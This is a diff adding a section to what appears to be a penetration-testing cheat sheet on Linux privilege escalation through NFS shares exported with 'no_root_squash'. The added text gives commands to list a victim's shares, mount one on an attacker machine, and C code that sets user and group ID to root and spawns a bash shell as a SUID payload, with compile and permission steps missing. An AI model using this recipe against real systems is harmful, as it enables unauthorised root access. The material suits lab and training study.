@@ -242,15 +242,32 @@ find / -writable 2>/dev/null | grep home | cut -d "/" -f 2 | sort -u
 
 **Network File Sharing**
 
-```JavaScript
+- NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
 
+- The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+- Start by enumerating mountable shares from your attacker machine
+
+
+```JavaScript
+showmount -e <VictimIP>
+```
+- You will then mount of the "no_root_squash" shares to the attacker machine and begin building the executable
+```JavaScript
+mkdir /tmp/backupsonattackermachine
+```
+```JavaScript
+mount -o rw <VictimIP>:/backups /tmp/backupsonattackermachine
 ```
 
-****
-
-
+Then set the SUID bits
 ```JavaScript
-
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
 ```
 
 ****
